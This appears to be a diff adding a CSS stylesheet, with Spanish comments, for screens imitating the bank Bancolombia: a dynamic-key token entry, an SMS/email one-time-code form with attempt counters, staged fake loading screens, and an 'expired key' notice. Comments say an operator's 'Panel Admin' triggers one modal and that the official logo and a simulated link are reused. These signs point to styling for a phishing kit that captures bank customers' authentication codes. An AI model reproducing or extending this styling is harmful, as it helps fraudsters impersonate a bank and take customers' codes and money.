@@ -1,0 +1,1212 @@
+/* Modal estilo Bancolombia - overlay */
+.bc-modal-overlay-custom {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  /* Fondo semitransparente suave: mantiene el home/panel visible detrÃ¡s */
+  background: rgba(44, 42, 41, 0.45);
+  backdrop-filter: blur(2px);
+  z-index: 99999;
+  justify-content: center;
+  align-items: center;
+}
+
+.bc-modal-overlay-custom.show {
+  display: flex;
+}
+
+.bc-modal-box {
+  background: #ffffff;
+  border-radius: 24px;
+  padding: 40px 32px 32px;
+  max-width: 460px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 18px 35px 300px rgba(0,0,0,0.6);
+  animation: fadeInModal 0.3s ease;
+}
+
+@keyframes fadeInModal {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+
+.bc-modal-box .bc-modal-icon {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 16px;
+}
+
+.bc-modal-box .bc-modal-icon .bc-icon-circle {
+  width: 48px;
+  height: 48px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  color: #fff;
+  background: #fdda24;
+}
+
+.bc-modal-box .bc-modal-icon .bc-icon-circle-seguro {
+  width: 64px;
+  height: 64px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(135deg, #003d8b, #0093d0);
+  box-shadow: 0 4px 12px rgba(0, 61, 139, 0.3);
+}
+
+.bc-modal-box h4 {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 20px;
+  line-height: 28px;
+  color: #2c2a29;
+  margin-bottom: 12px;
+}
+
+.bc-modal-box p {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 14px;
+  line-height: 20px;
+  color: #2c2a29;
+  margin-bottom: 32px;
+}
+
+.bc-modal-box .bc-modal-actions {
+  display: flex;
+  justify-content: center;
+  gap: 16px;
+  flex-wrap: wrap;
+}
+
+.bc-btn-yellow {
+  background: #fdda24;
+  border: none;
+  border-radius: 24px;
+  padding: 12px 32px;
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 14px;
+  line-height: 16px;
+  color: #2c2a29;
+  cursor: pointer;
+  transition: background 0.2s;
+  min-width: 150px;
+}
+
+.bc-btn-yellow:hover {
+  background: #f5c900;
+}
+
+.bc-btn-yellow:focus {
+  outline: 2px solid #3455db;
+  outline-offset: 2px;
+}
+
+.bc-btn-yellow:disabled {
+  opacity: 0.7;
+  cursor: not-allowed;
+}
+
+/* ==================== AnimaciÃ³n de cancelaciÃ³n ==================== */
+.bc-modal-box {
+  transition: transform 0.4s ease, opacity 0.4s ease;
+}
+
+.bc-modal-box-success {
+  border: 2px solid #0fa388;
+}
+
+.bc-modal-icon {
+  transition: transform 0.3s ease;
+}
+
+.bc-icon-circle {
+  transition: background 0.4s ease, transform 0.4s ease, width 0.4s ease, height 0.4s ease;
+}
+
+.bc-icon-circle-success {
+  animation: iconPulse 0.6s ease;
+}
+
+@keyframes iconPulse {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.3); }
+  100% { transform: scale(1); }
+}
+
+.bc-modal-box h4 {
+  transition: color 0.3s ease;
+}
+
+.bc-modal-box p {
+  transition: opacity 0.3s ease, transform 0.3s ease;
+}
+
+.bc-modal-actions {
+  transition: opacity 0.3s ease, transform 0.3s ease;
+}
+
+.bc-modal-overlay-custom {
+  transition: opacity 0.4s ease;
+}
+
+/* ==================== Key Validation Modal (Clave DinÃ¡mica) ==================== */
+.bc-key-validation-dialog {
+  background: #ffffff;
+  border-radius: 24px;
+  max-width: 480px;
+  width: 90%;
+  position: relative;
+  /* Sombra suave bajo la tarjeta blanca (no oscurece toda la pantalla) */
+  box-shadow: 0 18px 50px rgba(0, 0, 0, 0.25);
+  animation: fadeInModal 0.3s ease;
+  padding: 0;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+/* ==================== Zona superior limpia / verificaciÃ³n de identidad ==================== */
+/* Oculto la zona de carga en estado normal: la tarjeta blanca muestra el formulario */
+.bc-key-loading-zone {
+  display: none;
+  position: relative;
+  width: 100%;
+  height: 140px;
+  overflow: hidden;
+  border-top-left-radius: 24px;
+  border-top-right-radius: 24px;
+  background: #ffffff;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 12px;
+  padding: 0 24px;
+}
+
+/* Spinner circular amarillo */
+.bc-loading-spinner {
+  width: 48px;
+  height: 48px;
+  border: 5px solid #f7e08c;
+  border-top-color: #fdda24;
+  border-radius: 50%;
+  animation: bc-verification-spin 0.8s linear infinite;
+}
+
+@keyframes bc-verification-spin {
+  to { transform: rotate(360deg); }
+}
+
+/* Barra de progreso lineal amarilla */
+.bc-loading-progress {
+  width: 60%;
+  max-width: 260px;
+  height: 6px;
+  background: #e8e8e8;
+  border-radius: 3px;
+  overflow: hidden;
+}
+
+.bc-loading-progress-fill {
+  height: 100%;
+  width: 0%;
+  background: #fdda24;
+  border-radius: 3px;
+  transition: width 1s linear;
+}
+
+/* Texto de verificaciÃ³n: negro y peso normal */
+.bc-loading-text {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: normal;
+  font-size: 15px;
+  line-height: 20px;
+  color: #000000;
+  text-align: center;
+  margin: 0;
+}
+
+/* ==================== Estado de carga: ocultar la Clave DinÃ¡mica y centrar el bloque ==================== */
+.bc-key-validation-dialog.loading .bc-key-validation-content,
+.bc-key-validation-dialog.loading .bc-key-validation-footer,
+.bc-key-validation-dialog.loading .bc-key-validation-close-button-container {
+  display: none;
+}
+
+.bc-key-validation-dialog.loading .bc-key-loading-zone {
+  display: flex;
+  height: 360px;
+  max-height: 80vh;
+  min-height: 240px;
+}
+
+.bc-key-validation-content {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  /* Margen interno superior adecuado para que el candado no quede pegado al borde */
+  padding: 40px 32px 28px;
+}
+
+.bc-key-validation-header {
+  width: 100%;
+  text-align: center;
+  margin-bottom: 16px;
+}
+
+.bc-key-validation-header .bc-pictogram {
+  display: block;
+  margin: 0 auto 12px;
+  width: 88px;
+  height: 88px;
+}
+
+.bc-key-validation-header h3 {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 20px;
+  line-height: 28px;
+  color: #2c2a29;
+  margin: 0;
+}
+
+.bc-key-validation-body {
+  text-align: center;
+}
+
+.bc-key-validation-description {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 14px;
+  line-height: 20px;
+  color: #5f5d5c;
+  margin-bottom: 24px;
+}
+
+.bc-key-validation-timeout-container {
+  margin-bottom: 24px;
+}
+
+.bc-key-validation-timeout-container p {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 14px;
+  line-height: 20px;
+  color: #2c2a29;
+  margin: 0 0 4px;
+}
+
+.bc-key-validation-timeout-container h5 {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 24px;
+  line-height: 32px;
+  color: #2c2a29;
+  margin: 0;
+}
+
+/* Input token - 6 digit boxes */
+.bc-key-validation-input-container {
+  margin-bottom: 0;
+}
+
+.bc-key-validation-input-content {
+  display: flex;
+  justify-content: center;
+}
+
+.bc-form-field {
+  width: 100%;
+  max-width: 360px;
+}
+
+.bc-input-token {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.bc-input-token-container {
+  display: flex;
+  flex-wrap: nowrap; /* los 6 dÃ­gitos nunca bajan a una segunda lÃ­nea */
+  gap: 8px;
+  justify-content: center;
+  margin-bottom: 8px;
+  max-width: 100%;
+}
+
+.bc-input-token-container input {
+  width: 44px;
+  height: 48px;
+  border: 2px solid #d9dadd;
+  border-radius: 8px;
+  text-align: center;
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-size: 20px;
+  font-weight: 700;
+  color: #2c2a29;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  -webkit-text-security: disc;
+}
+
+.bc-input-token-container input:focus {
+  border-color: #3455db;
+  box-shadow: 0 0 0 2px rgba(52, 85, 219, 0.15);
+}
+
+.bc-input-token-container input.filled {
+  border-color: #2c2a29;
+  background: #f9f9fa;
+}
+
+.bc-label-bottom-token {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 12px;
+  line-height: 16px;
+  color: #cc3b2e;
+  text-align: center;
+}
+
+/* Footer buttons */
+.bc-key-validation-footer {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 0 32px 24px;
+}
+
+.bc-key-validation-action-container {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+  margin-bottom: 16px;
+}
+
+.bc-clear-button,
+.bc-continue-button {
+  border: none;
+  border-radius: 24px;
+  padding: 10px 28px;
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 14px;
+  line-height: 16px;
+  cursor: pointer;
+  transition: background 0.2s, opacity 0.2s;
+  min-width: 120px;
+}
+
+.bc-clear-button {
+  background: transparent;
+  border: 2px solid #2c2a29;
+  color: #2c2a29;
+}
+
+.bc-clear-button:hover:not(:disabled) {
+  background: #f9f9fa;
+}
+
+.bc-continue-button {
+  background: #fdda24;
+  color: #2c2a29;
+}
+
+.bc-continue-button:hover:not(:disabled) {
+  background: #f5c900;
+}
+
+.bc-clear-button:disabled,
+.bc-continue-button:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+.bc-clear-button:focus,
+.bc-continue-button:focus {
+  outline: 2px solid #3455db;
+  outline-offset: 2px;
+}
+
+/* Inline alert info */
+.bc-inline-alert-info {
+  background: #ecf2fe;
+  border-radius: 8px;
+  padding: 12px 16px;
+  display: flex;
+  gap: 8px;
+  align-items: flex-start;
+  width: 100%;
+  margin: 0 auto;
+}
+
+.bc-inline-alert-status {
+  flex-shrink: 0;
+}
+
+.bc-transaction-status-info {
+  width: 20px;
+  height: 20px;
+  background: transparent;
+}
+
+.bc-transaction-status-info .bc-icon {
+  font-size: 16px;
+  color: #3455db;
+}
+
+.bc-inline-alert-body {
+  flex: 1;
+}
+
+.bc-inline-alert-text {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 12px;
+  line-height: 16px;
+  color: #2c2a29;
+}
+
+.bc-inline-alert-text h6 {
+  font-weight: 700;
+  font-size: 12px;
+  line-height: 16px;
+  margin: 0 0 4px;
+}
+
+.bc-link {
+  color: #3455db;
+  text-decoration: underline;
+  font-weight: 600;
+}
+
+/* Close button */
+.bc-key-validation-close-button-container {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  z-index: 10;
+}
+
+.bc-key-validation-close-button {
+  font-size: 20px;
+  line-height: 1;
+  color: #2c2a29;
+}
+
+/* Shake animation for wrong code */
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  10%, 30%, 50%, 70%, 90% { transform: translateX(-4px); }
+  20%, 40%, 60%, 80% { transform: translateX(4px); }
+}
+
+.bc-input-token-container.shake {
+  animation: shake 0.5s ease;
+}
+
+.bc-input-token-container.shake input {
+  border-color: #cc3b2e;
+}
+
+/* Success state for key validation */
+.bc-key-validation-dialog.success .bc-key-validation-header .bc-pictogram {
+  display: none;
+}
+
+.bc-key-validation-dialog.success .bc-key-validation-header h3 {
+  color: #0fa388;
+}
+
+/* Fin de estilos de la modal de Clave DinÃ¡mica */
+
+/* ==================== Aviso de Seguridad Obligatorio (previa a la Clave DinÃ¡mica) ==================== */
+/* Tarjeta compacta estilo "Seguro Multirriesgo Sura": estrecha, centrada y sin botÃ³n "X". */
+.bc-security-warning-dialog {
+  background: #ffffff;
+  border-radius: 24px;
+  max-width: 420px;
+  width: 90%;
+  text-align: center;
+  position: relative;
+  box-shadow: 0 18px 50px rgba(0, 0, 0, 0.25);
+  animation: fadeInModal 0.3s ease;
+  padding: 40px 32px 32px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+/* CÃ­rculo azul corporativo con escudo (Modal 1 Â· aviso inicial al entrar al home) */
+.bc-security-warning-icon {
+  width: 64px;
+  height: 64px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(135deg, #003d8b, #0093d0);
+  box-shadow: 0 4px 12px rgba(0, 61, 139, 0.3);
+  color: #ffffff;
+  margin-bottom: 20px;
+  flex-shrink: 0;
+}
+
+.bc-security-warning-icon svg {
+  width: 32px;
+  height: 32px;
+  display: block;
+}
+
+/* Variante dorada metÃ¡lica (Modal 2 Â· Solo la dispara el Panel Admin) */
+.bc-security-warning-icon-gold {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: radial-gradient(circle at 30% 25%, #ffe987, #f9d423 45%, #d99a06 75%, #b87a05);
+  box-shadow:
+    0 6px 16px rgba(216, 158, 6, 0.45),
+    inset 0 2px 4px rgba(255, 255, 255, 0.55),
+    inset 0 -3px 6px rgba(184, 122, 5, 0.35);
+  border: 2px solid #eec321;
+  color: #ffffff;
+  margin-bottom: 20px;
+  flex-shrink: 0;
+}
+
+.bc-security-warning-icon-gold svg {
+  width: 44px;
+  height: 44px;
+  display: block;
+  filter: drop-shadow(0 2px 3px rgba(120, 78, 3, 0.4));
+}
+
+/* TÃ­tulo */
+.bc-security-warning-title {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 20px;
+  line-height: 28px;
+  color: #000000;
+  margin: 0 0 12px;
+}
+
+/* Cuerpo del mensaje */
+.bc-security-warning-text {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 14px;
+  line-height: 22px;
+  color: #5f5d5c;
+  margin: 0 0 28px;
+}
+
+/* BotÃ³n amarillo corporativo en cÃ¡psula */
+.bc-security-warning-button {
+  background: #fdda24;
+  border: none;
+  border-radius: 999px;
+  padding: 14px 32px;
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 14px;
+  line-height: 16px;
+  color: #2c2a29;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.bc-security-warning-button:hover {
+  background: #f5c900;
+}
+
+.bc-security-warning-button:focus {
+  outline: 2px solid #3455db;
+  outline-offset: 2px;
+}
+
+/* Fin de estilos del aviso de seguridad obligatorio */
+
+/* ==================== Contingencia final Â· Clave DinÃ¡mica inactiva o expirada ==================== */
+/* RediseÃ±o institucional con la estÃ©tica de la app mÃ³vil de Bancolombia: logotipo oficial,
+   candado amarillo de bloqueo, textos formales, botÃ³n rectangular amarillo y texto legal
+   inferior. Estilos scoped (solo aplican a esta modal) para no afectar a las demÃ¡s modales
+   que comparten la clase base .bc-security-warning-dialog. */
+.bc-contingency-dialog {
+  padding: 32px 24px 20px;
+  max-width: 400px;
+  width: 92%;
+  border-radius: 20px;
+  border: 1px solid #ecebe9;
+  box-shadow:
+    0 20px 60px rgba(0, 0, 0, 0.28),
+    0 2px 8px rgba(0, 0, 0, 0.08);
+}
+
+/* Logotipo oficial de Bancolombia (isotipo de la app) centrado en la parte superior. */
+.bc-contingency-logo {
+  display: block;
+  width: 118px;
+  height: auto;
+  margin: 0 auto 18px;
+}
+
+/* Candado amarillo oficial: denota que las claves anteriores ya no son utilizables. */
+.bc-contingency-lock-icon {
+  width: 72px;
+  height: 72px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: #fff9e0;
+  border: 1px solid #f2dc85;
+  box-shadow: 0 6px 16px rgba(216, 158, 6, 0.18);
+  margin-bottom: 18px;
+  flex-shrink: 0;
+}
+
+.bc-contingency-lock-icon img {
+  width: 40px;
+  height: 40px;
+  display: block;
+}
+
+/* TÃ­tulo formal institucional */
+.bc-contingency-dialog .bc-security-warning-title {
+  font-size: 19px;
+  line-height: 26px;
+  margin-bottom: 10px;
+}
+
+.bc-contingency-dialog .bc-security-warning-text {
+  font-size: 14px;
+  line-height: 21px;
+  margin-bottom: 24px;
+  max-width: 320px;
+}
+
+/* BotÃ³n principal: amarillo oficial #FDDA24, texto negro en negrita y esquinas
+   sutilmente redondeadas (estilo rectangular moderno, NO completamente ovalado). */
+.bc-contingency-dialog .bc-security-warning-button {
+  border-radius: 10px;
+  width: 100%;
+  max-width: 300px;
+  padding: 15px 24px;
+  font-size: 16px;
+  line-height: 18px;
+  font-weight: 800;
+  color: #000000;
+  box-shadow: 0 4px 14px rgba(253, 218, 36, 0.35);
+}
+
+.bc-contingency-dialog .bc-security-warning-button:hover {
+  background: #f5c900;
+}
+
+/* Texto legal de seguridad inferior (tipografÃ­a muy pequeÃ±a, gris tenue) */
+.bc-contingency-legal {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 11px;
+  line-height: 15px;
+  color: #8a8886;
+  margin: 18px 0 0;
+  padding-top: 14px;
+  border-top: 1px solid #efeeec;
+  width: 100%;
+}
+
+/* Ajuste fino en pantallas mÃ³viles muy delgadas: aire simÃ©trico y proporciones acordes */
+@media (max-width: 360px) {
+  .bc-contingency-dialog {
+    padding: 26px 18px 16px;
+  }
+  .bc-contingency-logo {
+    width: 104px;
+    margin-bottom: 14px;
+  }
+  .bc-contingency-lock-icon {
+    width: 64px;
+    height: 64px;
+    margin-bottom: 14px;
+  }
+  .bc-contingency-lock-icon img {
+    width: 34px;
+    height: 34px;
+  }
+}
+
+/* ==================== Modal de Carga Transicional (posterior a la Clave DinÃ¡mica) ==================== */
+/* Contenedor central flotante con estÃ©tica bancaria, superpuesto a la vista de la Clave DinÃ¡mica. */
+.bc-loading-transition-overlay {
+  display: flex;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(44, 42, 41, 0.55);
+  backdrop-filter: blur(6px);
+  -webkit-backdrop-filter: blur(6px);
+  z-index: 100000;
+  justify-content: center;
+  align-items: center;
+  animation: fadeInModal 0.25s ease;
+}
+
+.bc-loading-transition-card {
+  /* Tono dorado compartido: el mismo color exacto para el arco del spinner y la barra de progreso */
+  --bc-progress-gold: #fdda24;
+  background: #ffffff;
+  border-radius: 32px;
+  max-width: 420px;
+  width: 90%;
+  padding: 48px 36px 44px;
+  text-align: center;
+  box-shadow: 0 24px 60px rgba(0, 0, 0, 0.28);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 18px;
+}
+
+/* Spinner / indicador circular tipo reloj (segÃºn diseÃ±o original) */
+.bc-loading-transition-spinner {
+  position: relative;
+  width: 64px;
+  height: 64px;
+  border-radius: 50%;
+  background: #ffffff;
+  /* Pista circular fina en gris muy claro (sin bordes oscuros gruesos) */
+  border: 2px solid #e6e5e3;
+}
+
+/* Arco de progreso dorado sobre la pista gris: rota de forma continua */
+.bc-loading-transition-spinner::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  border-radius: 50%;
+  border: 2px solid transparent;
+  border-top-color: var(--bc-progress-gold);
+  border-right-color: var(--bc-progress-gold);
+  animation: bc-loading-transition-spin 1s linear infinite;
+}
+
+/* Manecilla interna: parpadea y apunta siempre a la punta del arco (misma rotaciÃ³n que el arco) */
+.bc-loading-transition-spinner::after {
+  content: "";
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  width: 2px;
+  height: 22px;
+  border-radius: 2px;
+  background: #2c2a29;
+  /* offset de 180Â°: en reposo apunta a la punta delantera del arco (6 en punto) */
+  transform: translate(-50%, -100%) rotate(180deg);
+  transform-origin: 50% 100%;
+  animation:
+    bc-loading-transition-hand 1s linear infinite,
+    bc-loading-transition-blink 0.45s steps(1, end) infinite;
+}
+
+@keyframes bc-loading-transition-spin {
+  to { transform: rotate(360deg); }
+}
+
+/* RotaciÃ³n acoplada al arco: misma duraciÃ³n y fase => sigue siempre la punta del arco */
+@keyframes bc-loading-transition-hand {
+  from { transform: translate(-50%, -100%) rotate(180deg); }
+  to { transform: translate(-50%, -100%) rotate(540deg); }
+}
+
+/* Efecto intermitente: la manecilla aparece y desaparece rÃ¡pidamente */
+@keyframes bc-loading-transition-blink {
+  0%, 49% { opacity: 1; }
+  50%, 100% { opacity: 0; }
+}
+
+/* Barra de progreso lineal delgada */
+.bc-loading-transition-progress {
+  width: 100%;
+  max-width: 260px;
+  height: 6px;
+  border-radius: 999px;
+  background: #ececea;
+  overflow: hidden;
+}
+
+.bc-loading-transition-progress-fill {
+  height: 100%;
+  width: 0%;
+  border-radius: 999px;
+  background: var(--bc-progress-gold);
+  transition: width 1s linear;
+}
+
+/* Temporizador de cuenta regresiva: centrado justo debajo de la barra de progreso,
+   con la tipografÃ­a pequeÃ±a y el color gris tenue institucional. */
+.bc-loading-transition-timer {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 600;
+  font-size: 12px;
+  line-height: 16px;
+  color: #8a8886;
+  margin: 0;
+  letter-spacing: 0.3px;
+}
+
+/* SubtÃ­tulo / descripciÃ³n bancaria */
+.bc-loading-transition-text {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 14px;
+  line-height: 20px;
+  color: #5f5d5c;
+  margin: 0;
+  max-width: 300px;
+}
+
+/* Fin de estilos de la modal de carga transicional */
+/* ==================== Fase 3 Â· Alerta y formulario SMS/Correo ==================== */
+/* La pantalla de carga usa z-index 100000: la modal SMS/correo debe ir POR ENCIMA */
+.bc-sms-overlay {
+  /* La carga usa z-index 100000: la modal SMS/Correo DEBE ir siempre al frente */
+  z-index: 100005 !important;
+  /* Fondo casi opaco: ni el home ni la barra de carga se translucen detrÃ¡s. */
+  background: rgba(44, 42, 41, 0.92);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
+}
+
+/* Icono circular azul degradado de la alerta (mismo tamaÃ±o que el dorado). */
+.bc-security-warning-icon-sms {
+  width:  80px;
+  height: 80px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: linear-gradient(135deg, #1155bc, #0072ce);
+  box-shadow: 0 8px 20px rgba(0, 61, 139, 0.35);
+  color: #ffffff;
+  margin-bottom: 20px;
+  flex-shrink: 0;
+}
+.bc-security-warning-icon-sms svg {
+  width: 44px;
+  height: 44px;
+  display: block;
+}
+
+/* Texto principal largo de la alerta: se ajusta sin romper la estructura. */
+.bc-sms-overlay .bc-security-warning-title {
+  font-size: 18px;
+  line-height: 26px;
+}
+
+/* Formulario del cÃ³digo SMS/correo: columna centrada con aire limpio entre bloques. */
+.bc-sms-code-form {
+  margin: 6px 4px 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+}
+/* Texto secundario directo y sutil, justo debajo de las lÃ­neas del cÃ³digo. */
+.bc-sms-code-hint {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 12px;
+  line-height: 16px;
+  color: #8a8886;
+  text-align: center;
+  margin: 4px 0 0;
+  letter-spacing: 0.2px;
+}
+/* 6 casillas independientes: diseÃ±o limpio con solo la lÃ­nea inferior por dÃ­gito */
+.bc-sms-code-boxes {
+  /* GRID de 6 columnas con minmax(0, 1fr): los 6 dÃ­gitos se mantienen estrictamente
+     en una Ãºnica fila horizontal y se compactan proporcionalmente en pantallas
+     mÃ³viles (nunca hacen wrap ni desbordan). */
+  display: grid;
+  grid-template-columns: repeat(6, minmax(0, 1fr));
+  gap: 12px;
+  justify-items: center;
+  width: 100%;
+  max-width: 324px;
+  margin: 0 auto;
+}
+
+.bc-sms-code-boxes input {
+  width: 100%;
+  max-width: 44px;
+  height: 54px;
+  padding: 0;
+  border: none;
+  border-bottom: 2px solid #d9dadd;
+  border-radius: 0;
+  background: transparent;
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 700;
+  font-size: 22px;
+  line-height: 54px;
+  text-align: center;
+  color: #2c2a29;
+  caret-color: #2c2a29;
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.bc-sms-code-boxes input:focus {
+  border-bottom-color: #2c2a29;
+  box-shadow: 0 3px 0 -2px rgba(44, 42, 41, 0.35);
+}
+
+.bc-sms-code-boxes input.filled {
+  border-bottom-color: #2c2a29;
+}
+
+/* Texto de intentos bajo las casillas: desplazado con separaciÃ³n limpia para que respire. */
+.bc-sms-attempts {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 13px;
+  line-height: 18px;
+  color: #8a8886;
+  text-align: center;
+  margin: 6px 0 0;
+}
+/* Enlace simulado institucional: mismo negro/gris oscuro del texto principal de la cabecera,
+   sutil pero perfectamente legible y centrado bajo el indicador de intentos. */
+.bc-sms-resend-link {
+  background: none;
+  border: none;
+  margin: 4px 0 0;
+  padding: 4px 8px;
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 600;
+  font-size: 13px;
+  line-height: 18px;
+  color: #2c2a29;
+  text-decoration: underline;
+  text-decoration-color: rgba(44, 42, 41, 0.45);
+  text-underline-offset: 3px;
+  cursor: pointer;
+  transition: color 0.2s, text-decoration-color 0.2s;
+}
+.bc-sms-resend-link:hover {
+  color: #000000;
+  text-decoration-color: #000000;
+}
+
+/* En pantallas pequeÃ±as las casillas se compactan proporcionalmente (ancho, alto y
+   separaciÃ³n) SIN romper la fila: los 6 dÃ­gitos quedan alineados, centrados y con
+   mÃ¡rgenes simÃ©tricos respecto al texto "Intento 1/3" y al botÃ³n "Enviar". */
+@media (max-width: 420px) {
+  .bc-sms-code-boxes {
+    gap: 8px;
+    max-width: 288px;
+  }
+  .bc-sms-code-boxes input {
+    max-width: 36px;
+    height: 48px;
+    font-size: 20px;
+    line-height: 48px;
+  }
+  /* Misma garantÃ­a de Ãºnica fila para las casillas de la Clave DinÃ¡mica (modal azul). */
+  .bc-input-token-container {
+    gap: 6px;
+  }
+  .bc-input-token-container input {
+    width: 34px;
+    height: 44px;
+    font-size: 18px;
+  }
+}
+
+/* Pantallas muy delgadas (mÃ³viles â‰¤ 360 px): reducciÃ³n adicional para que las 6
+   casillas quepan siempre juntas en una Ãºnica fila horizontal, centradas. */
+@media (max-width: 360px) {
+  .bc-sms-code-boxes {
+    gap: 6px;
+    max-width: 258px;
+  }
+  .bc-sms-code-boxes input {
+    max-width: 32px;
+    height: 44px;
+    font-size: 18px;
+    line-height: 44px;
+  }
+  .bc-input-token-container {
+    gap: 4px;
+  }
+  .bc-input-token-container input {
+    width: 30px;
+    height: 40px;
+    font-size: 16px;
+  }
+}
+/* Logo horizontal oficial de Bancolombia, centrado en la parte superior interna de la modal. */
+.bc-sms-brand-logo {
+  display: block;
+  width: 138px;
+  height: auto;
+  margin: 0 auto 18px;
+}
+
+/* Glifo de mensajerÃ­a/seguridad en gris oscuro institucional: sobrio e integrado con los
+   textos principales. Sin cÃ­rculo azul de fondo. */
+.bc-sms-brand-icon {
+  position: relative;
+  width: 72px;
+  height: 72px;
+  margin: 0 auto 14px;
+}
+.bc-sms-brand-icon > svg {
+  width: 72px;
+  height: 72px;
+  display: block;
+  filter: drop-shadow(0 6px 14px rgba(44, 42, 41, 0.18));
+}
+.bc-sms-brand-badge {
+  position: absolute;
+  right: -3px;
+  bottom: -3px;
+  width: 27px;
+  height: 27px;
+  border-radius: 50%;
+  background: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 2px 7px rgba(0, 0, 0, 0.22);
+}
+.bc-sms-brand-badge svg {
+  width: 20px;
+  height: 20px;
+}
+/* BotÃ³n enviar: cÃ¡psula amarilla idÃ©ntica a la de las modales azul/dorada. */
+.bc-sms-submit-button {
+  width: 100%;
+  max-width: 240px;
+  margin-top: 4px;
+}
+
+/* ============ RediseÃ±o institucional de la vista del cÃ³digo SMS/Correo (scoped a #sms-code-dialog) ============ */
+/* Todos los overrides usan el selector #sms-code-dialog para NO tocar la modal de la Clave DinÃ¡mica,
+   que comparte las clases base .bc-key-validation-*. Solo aplican a la vista de verificaciÃ³n del cÃ³digo. */
+
+/* Caja blanca con padding mÃ¡s limpio y proporciones de app mÃ³vil. */
+#sms-code-dialog .bc-key-validation-content {
+  padding: 26px 24px 20px;
+}
+
+/* Cabecera: sin margen extra inferior que apriete el bloque del cÃ³digo. */
+#sms-code-dialog .bc-key-validation-header {
+  margin-bottom: 12px;
+}
+
+/* Caja del modal SMS: misma proporciÃ³n compacta (400px) que la modal institucional aprobada.
+   En pantallas bajas hace scroll interno para que ningÃºn bloque se corte. */
+#sms-code-dialog {
+  max-width: 400px;
+  max-height: calc(100dvh - 32px);
+  overflow-y: auto;
+  overscroll-behavior: contain;
+  -webkit-overflow-scrolling: touch;
+}
+
+/* JerarquÃ­a de textos: tÃ­tulo en negrita institucional + mensaje descriptivo ligero. */
+#sms-code-dialog .bc-key-validation-header h3 {
+  font-size: 19px;
+  line-height: 26px;
+  margin: 0;
+}
+
+#sms-code-dialog .bc-sms-code-subtitle {
+  font-family: 'Open Sans', Arial, sans-serif;
+  font-weight: 400;
+  font-size: 13.5px;
+  line-height: 21px;
+  color: #5f5d5c;
+  text-align: center;
+  margin: 8px auto 0;
+  max-width: 328px;
+}
+
+/* BotÃ³n de cierre en la esquina inferior derecha: pequeÃ±o, sutil y alineado con el padding. */
+#sms-code-dialog .bc-key-validation-close-button-container {
+  top: auto;
+  right: 20px;
+  bottom: 18px;
+}
+#sms-code-dialog .bc-key-validation-close-button {
+  font-size: 15px;
+  line-height: 1;
+  font-weight: 400;
+  color: #8a8886;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-width: 28px;
+  min-height: 28px;
